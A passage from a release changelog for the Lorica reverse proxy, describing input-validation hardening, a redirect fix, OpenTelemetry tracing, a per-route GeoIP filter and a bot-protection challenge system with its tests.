`auto_ban_duration_s`, `bot_cookie_ttl_s`), `CachingTab` (`cache_ttl_s`, `cache_max_mb`, `stale_while_revalidate_s`, `stale_if_error_s`, `cache_vary_headers`), `UpstreamTab` (`connect_timeout_s`, `read_timeout_s`, `send_timeout_s`, `retry_attempts`, `retry_on_methods`), `RoutingMirror` (`mirror_sample_percent`, `mirror_timeout_ms`, `mirror_max_body_bytes`), settings `GlobalConfigTab` (`default_health_check_interval_s`, `cert_warning_days`, `cert_critical_days`, `max_global_connections`, `flood_threshold_rps`, `waf_ban_threshold`, `waf_ban_duration_s`, `access_log_retention`, `sla_purge_retention_days`) and `NetworkTab` (`trusted_proxies`, `connection_deny_cidrs`, `connection_allow_cidrs` via a shared `cidrListErr` helper that per-entry-validates the textarea). Each component also gains a scoped `.field-error` CSS class so the red-text styling matches the rest of the dashboard. 60+ inputs covered end-to-end; submit-time `validateRouteFormWithTab` remains as the final guard so nothing slips through if the operator never blurs out of a field.
- Low-severity field validation pass (Batch 7 of the guard-rails audit, wraps up the audit). New backend `validate_hostname_alias` runs the same RFC 1123 DNS check as `validate_redirect_hostname` but with wildcard-first-label support (`*.example.com`), wired into `create_route` and `update_route` so `hostname_aliases` is no longer a free-for-all field that would send junk all the way into the SNI table. `retry_on_methods` now goes through the shared `validate_http_method` (ASCII uppercase token, length cap 32) on both write paths - a lowercased or non-letter value used to reach the engine before this. New `validate_error_page_html` imposes a 128 KiB size cap on the operator-supplied error page; the runtime XSS sanitiser is still the last line of defense, but an accidental megabyte-of-logo-SVG no longer makes it into the store. Frontend mirror validators `validateHostnameAliasList` (reuses the same shape logic as the backend, with wildcard support) and `validateErrorPageHtml` in `validators.ts`; `retry_on_methods` reuses the Batch-2 `validateHttpMethodList`. All three wired into `validateRouteForm` + `validateRouteFormWithTab`. 6 new backend unit tests in `hostname_alias_tests` + `error_page_html_tests` cover bare / wildcard / scheme-rejection / length / label / dash-boundary cases.
- Global-settings validation pass (Batch 6 of the guard-rails audit). Backend `update_settings` gains an upper cap on `sla_purge_retention_days` (1..=3650 days / 10 years instead of just `>= 1`) and a control-character rejection on `otlp_service_name` (the existing 1..=256 char check did not stop an operator from pasting a binary blob). Frontend: `ObservabilityTab.svelte` gains blur-time inline errors on `otlp_endpoint` (reuses the shared `validateUrl` from `validators.ts` so the error shape matches the rest of the dashboard) and `otlp_service_name` (empty / 256-cap / control-char mirror of the backend rule). Notification webhook URLs already have browser-native `<input type="url" required>` validation; sufficient for a field that flows straight to `reqwest::Client::post`.
- Path-syntax validation pass (Batch 5 of the guard-rails audit). New shared `validate_route_path` helper in `lorica-api/src/routes/crud.rs` (1024-char cap, leading `/` required, whitespace + control-character rejection) is now applied uniformly to `path_prefix`, `strip_path_prefix`, `add_path_prefix`, and `path_rules[].path` from both `POST /routes` and `PUT /routes/:id` - the previous setup silently accepted malformed values on create (the `/` check only ran inside `build_path_rules` for per-rule paths, not for route-level fields) and had no length cap so a pasted megabyte blob could make it all the way to the store. `build_traffic_split` additionally rejects split names longer than 128 chars or containing control characters. Front-end mirror `validateRoutePath` in `validators.ts` and wired into both `validateRouteForm` and `validateRouteFormWithTab`, with the per-rule path also checked in the path-rules loop. 7 new backend unit tests in `route_path_validation_tests` + 2 in `traffic_splits::tests` cover every branch.
- Numeric-range validation pass (Batch 4 of the guard-rails audit). Every numeric route field now has an explicit range check on both sides of the wire instead of implicit-zero or bounded-by-integer-width guards. New shared `validate_route_numeric_bounds` helper in `lorica-api/src/routes/crud.rs` carries the bounds for `connect_timeout_s` / `read_timeout_s` / `send_timeout_s` (1..=3600 s), `cache_ttl_s` (1..=1 year), `cache_max_bytes` (1..=128 GiB), `max_connections` (1..=1_000_000), `slowloris_threshold_ms` (100..=600_000 ms, i.e. 10 min), `auto_ban_threshold` (1..=10_000), `auto_ban_duration_s` (1..=1 year), `return_status` (HTTP 100..=599), `retry_attempts` (0..=10), `stale_while_revalidate_s` + `stale_if_error_s` (0..=86_400 s, i.e. 1 day), `cors_max_age_s` (0..=86_400 s), and `max_request_body_bytes` (0..=128 GiB with 0 reserved for "unlimited"). Called from both `POST /routes` (with the same defaults the create path injects before storing so the bounds cover both operator input and library defaults) and `PUT /routes/:id` (against `Option<T>` so untouched fields stay untouched). Removes the inline `cors_max_age_s < 0` guard that `update_route` used to carry separately. Frontend mirror: `validateRouteForm` + `validateRouteFormWithTab` now range-check the matching form fields with human-readable error messages ("Cache TTL must be between 1 and 31536000 (1 year)", "Auto-ban duration must be between 1 and 31536000 (1 year)", etc.), routed to the appropriate tab (`cache`, `protection`, `upstream`, `general`) so a bad value surfaces the right section on submit. 7 new backend unit tests in `route_numeric_bounds_tests` cover defaults-accepted, timeout lower/upper bounds, the HTTP status-code range, the CORS TTL cap, the retry-attempts cap, and the max-connections / auto-ban threshold zero-rejection.
- mTLS validation pass (Batch 3 of the guard-rails audit). Backend `build_mtls_config` gains a per-organization length cap (256 chars), a control-character rejection (CR / LF / NUL / <0x20 / 0x7F - not valid in an X.509 `O=` RDN, so a pasted binary blob surfaces as a 400 instead of reaching the CA-bundle parser), and a 100-entry cap on the allowlist. Frontend: new `validateMtlsPemShape` (length cap + BEGIN / END marker check, matches the server-side shape guard so the operator sees the mistake before the drawer save round-trip), `validateMtlsOrganization` (empty / oversize / control-char), and `validateMtlsOrganizationList` (cap + per-entry check) in the shared `validators.ts` module; replaces the inlined regex / ad-hoc empty checks that used to live in `validateRouteForm` / `validateRouteFormWithTab`. Trailing / leading / doubled commas in the org list are now tolerated instead of blocking save - the backend already filters empties via the `tokenListToArray` shared helper, so the old "reject any empty slot" rule was stricter than the API and surfaced as surprise-400s for a common accidental keystroke. 4 new backend unit tests (org length cap, control-char rejection, entry-count cap, plus an assertion the existing PEM validator still catches garbage DER inside CERTIFICATE blocks) + 8 new frontend vitest cases cover the new shape.
- HTTP headers + CORS validation pass (Batch 2 of the wider guard-rails audit). New backend validators `validate_http_header_name` (RFC 7230 `token` - letters, digits, `!#$%&'*+-.^_`|~`; length cap 256), `validate_http_header_value` (rejects CR / LF / NUL so a rogue header value can not enable response-splitting; length cap 4096), `validate_http_headers_map`, `validate_http_header_name_list`, `validate_http_method` (ASCII uppercase letters only, length cap 32 - accepts `GET` / `POST` / `MKCOL` / custom verbs, rejects lowercase so the CORS machinery does not silently fail the case-sensitive compare), and `validate_cors_origin` (accepts `*`, `null`, or `scheme://host[:port]` - rejects path / query / fragment which the CORS spec ignores and which are always operator mistakes). Wired into both `POST /routes` (where route-level `proxy_headers`, `response_headers`, `proxy_headers_remove`, `response_headers_remove`, `cache_vary_headers`, `cors_allowed_origins`, `cors_allowed_methods` and `cors_max_age_s` previously passed straight through to the store) and `PUT /routes/:id`. Per-path-rule `response_headers` + `response_headers_remove` overrides are now validated by `build_path_rules`. Header-rules `header_name` gains the full RFC 7230 token check (the previous "must not be empty" rule let `X Space-Separated` through). Front-end mirror: new `validateHttpHeaderName`, `validateHttpHeaderValue`, `validateHttpMethod`, `validateCorsOrigin`, `validateHeadersMapText`, `validateHttpHeaderNameList`, `validateHttpMethodList`, `validateCorsOriginList` in the shared `validators.ts` module; wired into both `validateRouteForm` and `validateRouteFormWithTab` so a bad entry surfaces with the offending tab focus. `TransformTab.svelte` gains blur-time inline errors on the six header / CORS fields. 14 new backend unit tests in `http_header_validation_tests` + 14 new frontend vitest cases cover the RFC 7230 token alphabet, response-splitting rejection, method case-sensitivity, CORS origin shape, and every list-level error message.
- URL + regex validation pass (Batch 1 of the wider guard-rails audit that followed the `redirect_hostname` fix). Every operator-entered URL and regex field in the route model now has a matching validator on both sides of the wire. API-side: new `validate_redirect_to` (used by the route-level `redirect_to` and by `build_path_rules` for per-rule `redirect_to`), new `validate_path_rewrite_pattern` (extracted from the inline `update_route` check so the same contract applies to `POST /routes` too), new `validate_path_rewrite_replacement` (length cap + `$N` capture-group cross-check - rejects replacements that reference groups the pattern does not declare so literal `$1` bytes never reach the upstream by accident, with `$$` escape handling for operators who actually want a literal `$`). `build_path_rules` also gains a path-length cap (1024), a whitespace rejection, and a `return_status` range check (100..=599). `build_response_rewrite` gains the same capture-group cross-check plus length caps on both pattern and replacement (4096 chars each). Front-end mirror: removed the duplicate `validateUrl` / `validateRegex` shells from `route-form.ts` and consolidated onto the existing shared `validators.ts` module; added `validateRewriteReplacement` there; wired `validateUrl` / `validateRegex` / `validateRewriteReplacement` into both `validateRouteForm` (submit contract) and `validateRouteFormWithTab` (tab-switching contract) so a bad value surfaces with the offending tab focus. `GeneralTab.svelte` gains an inline blur error on `redirect_to` (`field-error` span under the input, same UX as the `redirect_hostname` error). Path rules and response rewrite rules validate on submit only (inline per-row errors deferred). 26 new backend unit tests across `redirect_to_validation_tests`, `path_rewrite_validation_tests`, `path_rules::tests`, and `response_rewrite::tests` + 20 new frontend vitest cases cover the full matrix including the Plex `/tesla` literal-URL case, the `$$` escape, named-group counting, and the label-specific error messages.

### Fixed

- Path-rule `redirect_to` was concatenating the matched request path and query onto the operator's target URL, which turned a Plex route with a `/tesla` path rule pointing at `https://www.youtube.com/redirect?q=https://plex.rwx-g.fr/` into `...?q=https://plex.rwx-g.fr/tesla` (the `/` was also stripped). The concatenation is the documented behavior for the route-level `redirect_to` (migration use case where every subpath carries over), but at the path-rule level the operator has already pinned the destination for that specific path - appending is meaningless and destroys URLs whose trailing `/` is part of a query value. A new `path_rule_literal_redirect` flag on `RequestCtx` is set when a matched path rule carries an explicit `redirect_to`, and the two redirect emitters (`return_status + redirect_to` and plain `redirect_to`) route through a new `build_redirect_location` helper that emits the target verbatim when the flag is set. Unit tests pin both behaviors so a future refactor cannot silently regress one or the other. Dashboard hint next to the path-rule Redirect input now documents the literal semantics.

## [1.4.0] - 2026-04-18

### Added

- OpenTelemetry tracing scaffolding (feature-gated, off by default). New Cargo feature `otel` on the `lorica` crate pulls in `opentelemetry` 0.31, `opentelemetry_sdk` 0.31, `opentelemetry-otlp` 0.31, `opentelemetry-semantic-conventions` 0.31 and `tracing-opentelemetry` 0.32. Policy matches `route53` since the v1.3.0 supply-chain audit (SC-M-3): non-OTel users do not pay the dep-graph cost and the `.deb` / `.rpm` / Dockerfile / CI build scripts stay on default features unchanged. Four new fields on `GlobalSettings`: `otlp_endpoint` (Option<String>, None = disabled at runtime even with the feature built in), `otlp_protocol` ("grpc" / "http-proto" / "http-json", default "http-proto"), `otlp_service_name` (default "lorica") and `otlp_sampling_ratio` (f64 in 0.0..=1.0, default 0.1 matching Tempo / Grafana overhead guidance). API validation in `PUT /api/v1/settings` enforces URL scheme, protocol enum, service-name length (1..=256), and finite sampling ratio. `global_settings` is a key-value table so no SQL migration is required; four new keys are read / written alongside the existing ones. Actual exporter init, span creation, W3C context propagation and log correlation land in the following stories
- W3C trace context propagation (always on, does not require the `otel` feature). `request_filter` parses the incoming `traceparent` header and either preserves the trace_id while rolling a new parent-span id for Lorica (when the client sent a well-formed header) or synthesises a fresh deterministic trace from the request_id (when there was no client header or it was malformed). `upstream_request_filter` then always injects the outgoing `traceparent` on the wire so the backend sees a continuous trace tree across the Lorica hop. `tracestate` passes through unchanged when present (vendor-opaque per RFC). The generated parent-span id uses FNV-1a 64 seeded by `(trace_id, request_id)` so two Lorica workers seeing the same request synthesise the same span id (required for well-formed trees under multi-worker fan-out). Parsing is ~50 ns and rejects malformed or reserved-zero values to avoid propagating client-injected garbage. Overhead when OTel is disabled: one header lookup + one parse attempt per request
- OTLP exporter lifecycle (feature-gated behind `otel`, no-op when the feature is off). `lorica::otel::init()` installs a global `SdkTracerProvider` when `GlobalSettings.otlp_endpoint` is set: builds an OTLP `SpanExporter` matching the configured protocol (http-proto via reqwest, http-json via reqwest, grpc via tonic), attaches a `Resource` carrying `service.name` / `service.version`, wraps a `ParentBased(TraceIdRatioBased)` sampler so a sampled parent always carries through the proxy hop, and installs the provider as the OTel global. Repeatable: a second `init()` tears down the previous provider atomically so a config reload that changes endpoint / protocol / service name / sampling ratio takes effect without a restart. `lorica::otel::shutdown()` flushes the batch exporter and releases the provider. Wired into all three runtime paths for init (single-process, supervisor, each forked worker) so every runtime installs its own independent exporter inside its own Tokio runtime and a stuck worker cannot block another worker's flush queue. Shutdown-time flush is wired for single-process and supervisor after their drain deadlines; workers inherit the `BatchSpanProcessor`'s periodic export (default ~5 s interval) which drains spans during steady-state operation (tracked as a follow-up to expose a pre-exit flush hook from `lorica-core::Server`, since `run_forever()` returns `!`). A `try_init_otel_from_settings(store, role)` helper deduplicates the three init call sites; the `role` label ("single-process" / "supervisor" / "worker") is included in the startup log line so multi-process installs can tell which component finished tracing init. Init failures are `warn!` and do not block startup (observability is not a critical path)
- Tracing -> OpenTelemetry bridge (story 1.4c). `init_logging` now installs a `tracing_opentelemetry::OpenTelemetryLayer` (feature-gated behind `otel`) wrapped in a `tracing_subscriber::reload::Layer` so the embedded `BoxedTracer` can be swapped from a startup-noop placeholder to the real provider once `otel::init` runs. The reload callback is type-erased behind a `Box<dyn Fn(BoxedTracer) + Send + Sync>` stored in `lorica::otel::OTEL_RELOAD_HOOK`, keeping the subscriber-chain type parameters out of `otel.rs`. With the bridge installed, every `#[tracing::instrument]` span on the proxy hot path (`http_request` on `request_filter`, `upstream_request_filter`, `response_filter`, `logging`, `fail_to_proxy`) is mirrored into an OTel span and exported via the global provider - no manual `BoxedSpan` plumbing left in `proxy_wiring`. The `http_request` root tracing span (now named after the OTel HTTP semconv convention rather than `request_filter`) is captured into `RequestCtx.root_tracing_span` at the top of the hook so the four child hooks can `parent = &ctx.root_tracing_span` their own `#[instrument]` spans under it, producing a properly nested trace tree in Jaeger / Tempo. The W3C parent context (when the client sent a valid `traceparent`) is set on the root span via `tracing_opentelemetry::OpenTelemetrySpanExt::set_parent`. Final-state HTTP semconv attributes (`http.response.status_code`, `lorica.latency_ms`, `server.address`, `network.peer.address`, `lorica.route_id`, `lorica.trace.origin`, `client.geo.country_iso_code`, `error.message`, plus the well-known `otel.status_code` mapped from 5xx -> ERROR / else -> OK) are recorded via `Span::record` on the root span at the end of `logging()` so the bridge emits them on span close. Removes the now-redundant `lorica::otel::ActiveSpan` wrapper + `start_root_span` helper + `ctx.otel_span` field - the bridge handles span creation end-to-end. Microbench file `otel_overhead` slimmed down to the always-on W3C wire-format primitives (the bridge cost is collector-bound and is measured via the `tests-e2e-docker/` Jaeger profile rather than via criterion in-process).
- Per-request OpenTelemetry root span (feature-gated behind `otel`). Each proxied request gets a `Server`-kind span named `HTTP {method}`, created in `request_filter` right after W3C traceparent parsing so the span links to the client's parent context when a valid header was present (trace_id preserved + remote parent span context attached, so Jaeger / Tempo renders the client above Lorica in the tree) or starts a fresh root otherwise. Span ends in the final `logging()` hook with OTel HTTP semconv attributes: `http.request.method`, `url.path`, `http.response.status_code`, `server.address` (Host header), `network.peer.address` (backend socket), `lorica.route_id` for consistency with the Prometheus label set, `lorica.latency_ms`, `lorica.trace.origin` ("client" vs "lorica"), and `error.message` on blocked / errored paths. Span status follows OTel convention (5xx -> Error, everything else -> Ok). The `ActiveSpan` wrapper in `lorica::otel` is a ZST when the feature is off, so call sites do not need `#[cfg]` guards and the compile-time overhead of the instrumentation is zero on default builds
- Log / trace correlation via `#[tracing::instrument]` on every proxy hook (`request_filter`, `upstream_request_filter`, `response_filter`, `logging`, `fail_to_proxy`). Each hook opens a tracing span whose fields carry `trace_id`, `span_id`, and `request_id`, read from the `outgoing_traceparent` populated in `request_filter` (W3C propagation is always on, so correlation fields are populated regardless of the `otel` feature). Every `tracing::info!` / `warn!` / `error!` emitted inside those hooks automatically inherits the span fields in both the JSON and text log outputs, so an operator can grep Loki / ELK for a Jaeger trace id and land directly on every Lorica log line for that request, or paste a `trace_id` from a log line into Jaeger / Tempo to jump to the trace. In `request_filter` the fields start as `field::Empty` and are filled via `Span::current().record(...)` immediately after traceparent parsing, so even the ACME challenge handler and the global flood / connection-limit rejections that happen at the top of the hook carry the correlation fields. No refactoring of the subscriber was required: the existing `tracing_subscriber::fmt().json()` configuration already emits span fields on every event record by default
- GeoIP country-code filter per route (v1.4.0 Epic 2 stories 2.1 / 2.2 / 2.3 / 2.4 / 2.5 / 2.6 / 2.7). Dashboard integration: new "GeoIP country filter" section in the Protection tab with a mode dropdown (Allowlist / Denylist) and a comma-separated country list input. Front-end validation mirrors the API side - empty denylist is legal and means "filter off for this route", allowlist with empty list is rejected server-side. TESTING-GUIDE section 19 walks through the first-run DB install (manual curl + gunzip to `/var/lib/lorica/geoip.mmdb`), dashboard config, faked-source-IP test via `X-Forwarded-For`, and the CC-BY 4.0 attribution requirement. Attribution for the DB-IP Lite Country source added to the top-level `NOTICE` file as required by the CC-BY 4.0 licence. Data source is `DB-IP Lite Country` (CC-BY 4.0, no account required, monthly refresh). New `lorica-geoip` crate wraps `maxminddb 0.27` behind a lock-free `ArcSwapOption<maxminddb::Reader>` so hot-swaps are atomic; per-lookup cost is a single `decode_path` call on `country.iso_code`. Typed `CountryCode` newtype (two uppercase ASCII letters) and typed `GeoIpError` (Io / Parse / SanityCheck) surface from the loader. `GeoIpResolver::load_from_path` sanity-checks by looking up `8.8.8.8` before publishing - a file that parses as `.mmdb` but indexes nothing useful is rejected, keeping the previous DB live. The auto-update task in `lorica_geoip::updater` downloads the current-month `.mmdb.gz` once a week via reqwest + flate2, decompresses with a 128 MiB uncompressed cap (zip-bomb guard), validates via the resolver's own sanity check in a temp file, then atomic-renames onto the operator-configured path and calls `resolver.load_from_path` so the in-memory reader is replaced without dropping in-flight lookups. Fail-soft: any cycle error (network blip, response too small, gzip decode error, DB validation failure) keeps the previously-loaded DB live and retries on the next tick. Wired into all three runtimes: single-process opens the DB and spawns the updater inside its own tokio runtime; the supervisor runs a standalone updater that keeps the on-disk copy fresh (workers pick up the refresh on restart); each forked worker opens its own read-only copy at fork time. Per-route `Route.geoip = Option<GeoIpConfig>` carries `mode: Allowlist | Denylist` + `countries: Vec<String>`; evaluation placement is after per-route IP allow / deny and before WAF so a cheap geographic rejection runs before expensive regex matching. Unknown country (reserved / private IP, DB miss) falls through without blocking so a legitimate client behind a corporate NAT is never accidentally denied - operators that want fail-close semantics layer `ip_allowlist` on top. API validation in `POST/PUT /api/v1/routes` rejects non-ISO-alpha-2 country codes, dedups + uppercases the list, caps at 300 entries, and refuses an empty `countries` list in allowlist mode (would block everything). Schema migration V34 adds the idempotent `routes.geoip` column; existing rows continue to serialise as NULL. Two new `GlobalSettings` fields: `geoip_db_path` (absolute path, Option<String>, None = feature off) and `geoip_auto_update_enabled` (bool, default false - operators opt in after reading the CC-BY 4.0 attribution requirement). Observability: new Prometheus counter `lorica_geoip_block_total{route_id, country, mode}` fires on every rejection (bounded cardinality: routes * ~240 countries * 2 modes), and the resolved country is stamped on the per-request OTel root span as `client.geo.country_iso_code` on every request - even the ones that are not blocked - so Jaeger / Tempo traces carry geography for analytics and anomaly detection regardless of whether a route's rule actually fired
- OpenTelemetry E2E smoke test in `tests-e2e-docker/` under a new docker-compose `otel` profile. Brings up Jaeger all-in-one (1.60, OTLP gRPC + HTTP enabled) alongside a Lorica built with `--build-arg LORICA_FEATURES=otel`, then runs `run-otel-smoke.sh` in the test-runner container which logs into the management API, configures `otlp_endpoint=http://jaeger:4318` + `sampling_ratio=1.0`, creates a test route, sends a traced request carrying a deterministic W3C traceparent (`00-4bf92f35...4736-00f067aa0ba902b7-01`), polls the Jaeger HTTP query API (`/api/traces/{id}`) for up to 30 s, and asserts the resulting span carries the expected HTTP semconv tags (`http.request.method=GET`, `http.response.status_code=200`, `url.path=/`, `lorica.route_id` matching the created route id). New `LORICA_FEATURES` build arg on `tests-e2e-docker/Dockerfile` selects Cargo features at build time so the same Dockerfile covers both the default and OTel-enabled images. The smoke test exits non-zero on any missing span / missing tag, making it suitable for wiring into CI later without noise
- Hot-reload of `GlobalSettings.geoip_db_path` (v1.4.0 Epic 2 follow-up). A dashboard edit to the DB path previously required a Lorica restart to take effect because `load_from_path` on the process-wide resolver only ran in the boot path. New `apply_geoip_settings_from_store` hook in `lorica::reload` wires into every `reload_proxy_config*` entry point and calls `load_from_path` (or `unload()` when the path is cleared) on the resolver handle registered at startup via a new `lorica::geoip::set_handle` / `handle()` pair (OnceLock<Arc<GeoIpResolver>> - same "type-erased hook out of the chain" pattern as `otel::OTEL_RELOAD_HOOK`). Dedup via a `parking_lot::Mutex<Option<String>>` snapshot so unrelated settings edits do not re-open the `.mmdb` on every reload. On failure the old DB stays live, the snapshot is NOT advanced, and a `warn!` fires so the operator sees the problem on the next save attempt. Worker mode keeps its startup-load semantics for now: the supervisor's reload covers supervisor-side lookups; worker-side in-memory readers pick up updater-written files on the next 24-hour tick or a worker restart (broadcasting an RPC reload command to workers is tracked as a v1.4.x follow-up)
- Auto-update cadence for the DB-IP Lite Country feed kept at 7 days (`lorica_geoip::updater::UPDATE_INTERVAL`). Weekly downloads stay within the DB-IP free-tier fair-use policy while keeping Lorica within one week of any mid-month upstream re-score. Bandwidth cost is trivial (~3 MiB gzip per week) and the atomic ArcSwap publish means in-flight requests are never blocked
- GeoIP Docker E2E smoke test under a new docker-compose `geoip` profile (v1.4.0 Epic 2 story 2.7 coverage). Brings up a Lorica container with MaxMind's open `GeoIP2-Country-Test.mmdb` fixture (Apache-2.0, checked in under `tests-e2e-docker/fixtures/`) volume-mounted at `/var/lib/lorica/geoip-test.mmdb`. `run-geoip-smoke.sh` sets `geoip_db_path` + `trusted_proxies` over the management API (exercising the new hot-reload hook end-to-end - not a startup pre-seed), creates a route, drives three requests with known fixture IPs (US = 214.78.120.5, KR = 2001:220::1, unknown = 192.0.2.1) via `X-Forwarded-For`, flips the route between `denylist=[US]` and `allowlist=[US]`, and asserts status codes plus `lorica_geoip_block_total{route_id, country, mode}` counter deltas. Covers the three decision branches (allowlist pass / deny, denylist pass / deny) and the unknown-country fallthrough design choice end-to-end. 16/16 assertions pass on the real Docker run
- Worker-mode OpenTelemetry E2E smoke test under a new docker-compose `otel-workers` profile (v1.4.0 Epic 1 story 1.6 coverage). Same `run-otel-smoke.sh` script runs against a Lorica built with `--features otel` AND `--workers 2`, so the OTel init path (`try_init_otel_from_settings("worker")`) gets exercised inside a forked worker process rather than just single-process mode. Separate Jaeger instance (`jaeger-workers`) and shared volume (`shared-otel-workers`) keep the two OTel profiles independent; the single-process `otel` profile was otherwise unchanged
- Log / trace correlation assertion in `run-otel-smoke.sh` (v1.4.0 Epic 1 story 1.5 coverage). New `entrypoint-otel.sh` tees Lorica's JSON log to `/shared/lorica.log`; after the traced request fires, the smoke greps for the client's W3C `trace_id` in the log, proving the `span.record("trace_id", ...)` on the `http_request` root span flattens into the fmt layer's JSON output. Without this assertion, earlier smokes would have regressed silently if the fmt layer was ever refactored to drop span fields
- OTel log/trace correlation check in the smoke is non-destructive when the log file is missing (soft fail with diagnostic tail) so an operator debugging a compose file typo sees useful context instead of a cryptic grep miss
- Unit tests for `GeoIpConfig::blocks()` (7 cases) extracted into `lorica-config` so the allowlist / denylist decision rule is directly verifiable without a proxy session; `request_filter` now calls the extracted method instead of inlining the match. Unit tests for the API validator `validate_geoip` (8 cases covering case normalisation, trimming, dedup, alpha-2 enforcement, oversize-list cap, and the allowlist-must-be-non-empty rule). Unit test for `inc_geoip_block` that exercises the Prometheus counter through the public API and scrapes the text format to prove the `(route_id, country, mode)` triple shows up with the expected count. HTTP mock integration tests for `lorica_geoip::updater::run_once` covering the 404, `TooSmall`, `TooLarge`, and `Validation` error branches (uses a minimal `std::net::TcpListener` server in a worker thread - no new dev-deps beyond extending `tokio` with `net` + `rt-multi-thread`)
- **Bot-protection design doc** (v1.4.0 Epic 3, story 3.1) at `docs/architecture/bot-protection.md`. Specifies the three graded challenge modes (Cookie, JavaScript PoW, image captcha), the HMAC-signed verdict cookie wire format (route_id + /24 v4 or /64 v6 IP prefix + expires_at + mode, 41 or 46 bytes before base64url), the PoW algorithm (SHA-256 over `hex_nonce || counter_decimal` with 14–22 configurable leading zero bits), the captcha alphabet defaults, the five-category bypass matrix (IP CIDRs, ASNs, countries, User-Agent regex, rDNS with forward confirmation), the `only_country` inverse gate, the HMAC secret lifecycle (rotated on each cert renewal so cookie validity is capped at the cert TTL), and the exact request-filter placement (after GeoIP, before forward_auth). Includes an in-scope / out-of-scope threat model and an implementation-checklist that maps 1:1 to the remaining stories
- **`lorica-challenge` crate** (v1.4.0 Epic 3, story 3.2). New workspace member with three modules: `cookie` (HMAC-SHA256 sign / verify with `subtle::ConstantTimeEq` on the tag, ± 30 s clock-skew grace at verify time, deterministic wire size 41 / 46 bytes before base64url - size pinned by tests), `pow` (`Challenge::new` with mandatory difficulty bound 14..=22, hex-encoded 16-byte nonce, `verify_solution` with O(1) SHA-256 check + bit-mask comparison, plus test-only `mine` for reproducible round-trip tests), `captcha` (image generation via the pure-Rust `captcha = "1.0"` crate with a curated alphabet that excludes both visual confusables `0/O/1/l/I` and the glyphs the default font cannot render `L/o`; verify is case-insensitive with constant-time compare), and `secret` (process-wide HMAC-SHA256 key in `ArcSwap<Option<Arc<[u8; 32]>>>`, hot-swappable via `rotate`, generated from `OsRng` via `generate`). 52 unit tests covering every public boundary: HMAC forgery attempts (flipped payload byte, flipped tag byte, wrong secret), length and discriminator validation, NAT-tolerance semantics (same /24 or /64 still validates), expiry grace, PoW off-by-one, bit-mask behaviour across byte boundaries, captcha alphabet rules, mismatch detection, and RNG non-determinism. No `unwrap` on any user-reachable path. Dep footprint: RustCrypto (hmac 0.12 + sha2 0.10 + subtle 2), base64 0.22, rand 0.8, arc-swap 1, once_cell 1, captcha 1.0 (which pulls image + lodepng for PNG encoding); all version-pinned to match the existing `Cargo.lock` transitive resolution so the workspace does not pull two copies of anything
- **Bot-protection config model + migration V35** (v1.4.0 Epic 3, story 3.3). New `Route.bot_protection: Option<BotProtectionConfig>` field in `lorica-config::models::route` carrying `mode` (Cookie / Javascript / Captcha), `cookie_ttl_s` (u32, default 86400, capped at 604800 = 7 days), `pow_difficulty` (u8 in 14..=22, default 18), `captcha_alphabet` (String, default excludes `0/O/1/l/I` and the font-unsupported `L/o`), a `bypass: BotBypassRules` sub-struct (ip_cidrs, asns, countries, user_agents, rdns), and `only_country: Option<Vec<String>>` inverse gate. New `GlobalSettings.bot_hmac_secret_hex` field for the process-wide HMAC secret (hex-encoded so the key-value `global_settings` table does not need a BLOB column). Idempotent `ALTER TABLE routes ADD COLUMN bot_protection TEXT` migration - existing rows serialise as NULL. `validate_bot_protection` in `lorica-api::routes::crud` enforces difficulty bounds, alphabet shape (10..=128 ASCII- printable chars, no duplicates), CIDR syntax, ISO alpha-2 country codes (case-normalised to upper), UA regex compilation, rDNS shape rules (no bare TLD, no leading dot, printable ASCII), and a 500-entry cap per bypass category. 19 unit tests cover every rejection branch. RouteResponse + CreateRouteRequest + UpdateRouteRequest all expose the new field over the API, and the existing `route_to_response` / create / update handlers are wired end-to-end
- **Bot-protection challenge rendering** (v1.4.0 Epic 3, story 3.4). New `lorica_challenge::render` module produces self-contained HTML pages for the three modes - no external CSS, no CDN, no remote script. `render_cookie_refresh_page` emits a `meta http-equiv="refresh"` bounce for the passive mode; `render_pow_page` embeds an inline SHA-256 PoW worker using `crypto.subtle.digest` with chunked async execution and `requestAnimationFrame`-based progress updates so the UI stays responsive at high difficulty; `render_captcha_page` places the one-shot signed image URL + a single-field form. Every page carries a `<noscript>` fallback block that never loads anything remotely, embeds a `prefers-color-scheme: dark` media query for mobile dark-mode users, and uses system fonts (no web-font fetch). `render_plaintext_fallback` produces a short 403 body for clients that did not advertise `text/html` in Accept so curl / wget see a meaningful message. HTML escaping covers the five dangerous characters (`& < > " '`) on every substituted value - regression-tested so a route hostname containing `</script>` cannot break out of the JS block, and a submit URL containing `"` cannot escape the attribute context. 11 unit tests cover escaping, field propagation, optional contact-line rendering, difficulty-dependent hint text, and UTF-8 declaration
- **Bot-protection E2E Docker smoke + TESTING-GUIDE section 20** (v1.4.0 Epic 3, stories 3.9 + 3.10). New docker-compose `bot` profile with a `lorica-bot` container (default features, GeoIP fixture mounted so the country-bypass resolves for known test IPs) and a `bot-smoke` test-runner. 30 assertions on a real Docker run, green end-to-end: Cookie mode (challenge page + Set-Cookie + passthrough-on-replay), JavaScript PoW (mine at difficulty 14 via a `python3` helper embedded in the shell script, POST nonce+counter to `/lorica/bot/solve`, 302 + Set-Cookie, passthrough on replay, wrong-counter replay is rejected with 403), Captcha (page renders with an `/lorica/bot/captcha/{nonce}` image URL, `Content-Type: image/png`, unknown nonce returns 404), all three functional bypass categories (IP CIDR, country, UA regex), the `only_country` inverse gate, and the Prometheus counter increments across the `{shown, passed, bypassed}` outcomes. TESTING-GUIDE section 20 walks through each mode with copy- pasteable curl + python recipes, lists the metrics to watch, and documents the four v1.4.0 limitations (ASN / rDNS deferred, cross-worker stash per-worker, HMAC rotation on cert renewal not yet auto-wired, rDNS-without-forward-confirm explicitly marked as a must-not regression)
